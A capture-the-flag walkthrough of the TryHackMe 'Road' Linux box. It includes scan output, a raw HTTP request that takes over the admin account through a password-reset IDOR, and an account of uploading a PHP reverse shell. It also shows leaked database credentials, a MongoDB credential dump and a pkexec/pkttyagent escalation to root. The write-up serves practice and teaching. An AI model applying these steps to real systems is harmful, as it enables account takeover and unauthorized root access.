---
title: "Road"
type: docs
tags:
  - thm
  - linux
  - easy
  - idor
  - password-reset
  - file-upload
  - mongodb
  - pkexec
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Easy, **Host:** `road.thm` (Sky Couriers)

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `/v2/admin/register.html` lets anyone **register an admin account** and log in.
2. The password-reset form (`/v2/lostpassword.php`) trusts a client-supplied `uname` field → set it to **`admin@sky.thm`** and reset the real admin's password (**account takeover / IDOR**).
3. As admin, the profile-image upload accepts a **PHP reverse shell** → `/v2/profileimages/shell.php` → shell as `www-data`.
4. A PHP source file leaks MySQL `root:ThisIsSecurePassword!`, nothing useful in MySQL, but **MongoDB** (`localhost:27017`, no auth) has `db.user.find()` → `webdeveloper:BahamasChapp123!@#`.
5. `su webdeveloper`; that user is in the `sudo`/admin polkit identity → **`pkexec /bin/bash`** (auth on a second TTY via `pkttyagent`) → root.

</div>

<div class="callout callout-key">

**Credentials**

- MySQL: `root` : `ThisIsSecurePassword!`
- MongoDB `user` collection → `webdeveloper` : `BahamasChapp123!@#`

</div>

---

## Full Walkthrough

```console
<!-- nmap scan -->
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| vulners: [output trimmed - CVE reference dump]
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: Apache/2.4.41 (Ubuntu)
| vulners: [output trimmed - CVE reference dump]
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.200.9
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.200.9:80/
|     Form id: filter
|     Form action: /v2/admin/track_orders
|     
|     Path: http://10.10.200.9:80/index.html
|     Form id: filter
|_    Form action: /v2/admin/track_orders
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<!-- nmap scan -->

Error Log: /usr/share/dirsearch/logs/errors-21-11-30_16-36-10.log

Target: http://10.10.200.9/

[16:36:10] Starting: 
[16:36:11] 200 -   19KB - /index.html
[16:36:14] 200 -   19KB - /.
[16:36:15] 403 -  276B  - /.html
[16:36:17] 403 -  276B  - /.php
[16:36:21] 403 -  276B  - /.htm
[16:36:22] 403 -  276B  - /.htpasswds
[16:36:28] 403 -  276B  - /wp-forum.phps
[16:36:31] 200 -    9KB - /career.html
[16:36:40] 403 -  276B  - /.htuser
[16:36:51] 403 -  276B  - /.ht
[16:36:51] 403 -  276B  - /.htc
[16:37:24] 403 -  276B  - /.htacess


4.9.4 (2020-01-07)
- issue #15724 Fix 2FA was disabled by a bug
- issue        [security] Fix SQL injection vulnerability on the user accounts page (PMASA-2020-1)


http://road.thm/phpMyAdmin/ChangeLog


Inside `/v2/admin/register.html` I found that the registration form never checked whether the account being created should carry admin privileges at all. I was able to register a brand-new admin account outright and log straight in with it, no invite code, no approval step, nothing gating it.

http://road.thm/v2/index.php


 Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes. 


 <!-- ADMIN PWNED -->
 POST /v2/lostpassword.php HTTP/1.1
Host: road.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------2778620503407202351090447108
Content-Length: 640
Origin: http://road.thm
DNT: 1
Connection: close
Referer: http://road.thm/v2/ResetUser.php
Cookie: PHPSESSID=hngh4h8c1fda7ccb1rutemaele; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------2778620503407202351090447108
Content-Disposition: form-data; name="uname"

admin@sky.thm
-----------------------------2778620503407202351090447108
Content-Disposition: form-data; name="npass"

test
-----------------------------2778620503407202351090447108
Content-Disposition: form-data; name="cpass"

test
-----------------------------2778620503407202351090447108
Content-Disposition: form-data; name="ci_csrf_token"


-----------------------------2778620503407202351090447108
Content-Disposition: form-data; name="send"

Submit
-----------------------------2778620503407202351090447108--
<!-- admin pwned -->


Once inside as this self-registered admin, I noticed the password-reset flow trusted whatever email address I put into a hidden `uname` field rather than tying the reset to my own authenticated session. That meant I could submit the real administrator's address, `admin@sky.thm`, in that field and reset *their* password instead of my own: a textbook broken-access-control bug hiding inside a password-reset form.


With the real administrator's password now mine, I tried it against phpMyAdmin at `http://road.thm/phpMyAdmin/`, hoping the same login would carry over to the database console.

<!-- error message -->
 mysqli::real_connect(): (HY000/1045): Access denied for user 'admin@sky.thm'@'localhost' (using password: YES)
<!-- error message -->

```console
❯ k1b0r@pwned~/thm/road via 🐘 v8.0.12 took 21s 
❯ nikto -h 10.10.200.9 -id "admin@sky.thm:test"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.200.9
+ Target Hostname:    10.10.200.9
+ Target Port:        80
+ Start Time:         2021-11-30 17:36:07 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x4c97 0x5ce886fbdbcdf 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ /phpMyAdmin/: phpMyAdmin directory found
+ 7519 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-11-30 17:49:09 (GMT-5) (782 seconds)
```


While digging through the static assets nikto turned up, I noticed a chunk of the site's own front-end source leaking useful detail: directory names, the admin panel's template markup, and a full list of the JS bundles it loads.

```html
 fontawe

 assets

 <!-- response -->
 <!-- /v2/profileimages/ -->
<script type="text/javascript">
        function showtab(tab){
          console.log(tab);
          if(tab == 'new_task'){
            $('#new_task').css('display','block');
            $('#your_task').css('display','none');
          }else{
            $('#new_task').css('display','none');
            $('#your_task').css('display','block');
          }
        }
      </script>
        
        
          <small class="version"> </small>
          <small class="copyright">2021 © <a href="index.php">Sky Couriers</a></small>
        
      
    
    <script src="../assets/js/vendor.min.js"></script>
    <script src="../assets/js/elephant.min.js"></script>
    <script src="../assets/js/application.min.js"></script>
    <script src="../assets/js/demo.min.js"></script>

    <script src="../assets/js/ckeditor.js" type="text/javascript"></script>
  <script type="text/javascript">
$(function() {
    $('input[name="daterange"]').daterangepicker();
});
</script>
<!-- Include Required Prerequisites -->
<script type="text/javascript" src="../assets/js/moment.min.js"></script>

 
<!-- Include Date Range Picker -->
<script type="text/javascript" src="../assets/js/daterangepicker.js"></script>
<link rel="stylesheet" type="text/css" href="../assets/css/daterangepicker.css" />
  </body>
  <!-- response -->
```

  The admin panel's profile-image upload feature was next. I intercepted the request in Burp and checked the response carefully, since nothing on the server side appeared to validate that the uploaded file was actually an image, so I swapped in a PHP reverse shell instead and used the response to work out exactly where the application had stored it on disk.

```
  /v2/profileimages/
```


```bash
  <!-- mysql internal creds -->
<?php
$username = filter_input(INPUT_POST, 'User_Email');
$password = filter_input(INPUT_POST, 'User_Pass');
$contact = filter_input(INPUT_POST, 'Us_Cont');
if (!empty($username)){
if (!empty($password)){
$host = "localhost";
$dbusername = "root";
$dbpassword = "ThisIsSecurePassword!";
$dbname = "SKY";
// Create connection
$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);
```


  <!-- mysql internal creds -->

  (remote) www-data@sky:/var/www/html/v2/admin$ mysql -u root -h localhost -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2010
Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

```console
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| SKY                |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.03 sec)
```

mysql> 


(remote) www-data@sky:/tmp$ cat /etc/mongod.conf
# mongod.conf

# for documentation of all options, see:
#   http://docs.mongodb.org/manual/reference/configuration-options/

# Where and how to store data.
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
#  engine:
#  mmapv1:
#  wiredTiger:

# where to write logging data.
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log

# network interfaces
net:
  port: 27017
  bindIp: 127.0.0.1


# how the process runs
processManagement:
  timeZoneInfo: /usr/share/zoneinfo

#security:

#operationProfiling:

#replication:

#sharding:

### Enterprise-Only Options:

#auditLog:

#snmp:


MySQL turned up nothing beyond confirming the schema, so I turned my attention to the other database service I'd seen running locally on the box: MongoDB.

> listCollections
uncaught exception: ReferenceError: listCollections is not defined :
@(shell):1:1
> help
        db.help()                    help on db methods
        db.mycoll.help()             help on collection methods
        sh.help()                    sharding helpers
        rs.help()                    replica set helpers
        help admin                   administrative help
        help connect                 connecting to a db help
        help keys                    key shortcuts
        help misc                    misc things to know
        help mr                      mapreduce

        show dbs                     show database names
        show collections             show collections in current database
        show users                   show users in current database
        show profile                 show most recent system.profile entries with time >= 1ms
        show logs                    show the accessible logger names
        show log [name]              prints out the last segment of log in memory, 'global' is default
        use <db_name>                set current database
        db.mycoll.find()             list objects in collection mycoll
        db.mycoll.find( { a : 1 } )  list objects in mycoll where a == 1
        it                           result of the last line evaluated; use to further iterate
        DBQuery.shellBatchSize = x   set default number of items to display on shell
        exit                         quit the mongo shell
> show tables
collection
user
> show user
uncaught exception: Error: don't know how to show [user] :
shellHelper.show@src/mongo/shell/utils.js:1191:11
shellHelper@src/mongo/shell/utils.js:819:15
@(shellhelp2):1:1
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }


linpeas flagged something worth investigating about the `pkexec` binary on this box, which was reason enough to dig into it directly.

The first step was finding the PID of the terminal session I intended to authenticate from, since `pkttyagent` needs to be pointed at a specific process:

echo $$

```console
webdeveloper@sky:/var/backups$ echo $$
84840
webdeveloper@sky:/var/backups$ pkttyagent -p 84840
^C
webdeveloper@sky:/var/backups$ pkttyagent -p 85065
```


That PID belonged to a second terminal where I was already logged in as `webdeveloper`, so from that same session I ran: 

```console
webdeveloper@sky:~$ pkexec /bin/bash
root@sky:~# 
```


I entered the `webdeveloper` password into the polkit authentication prompt that appeared on that second session, and the pending `pkexec` call on my original shell dropped straight into a root prompt.
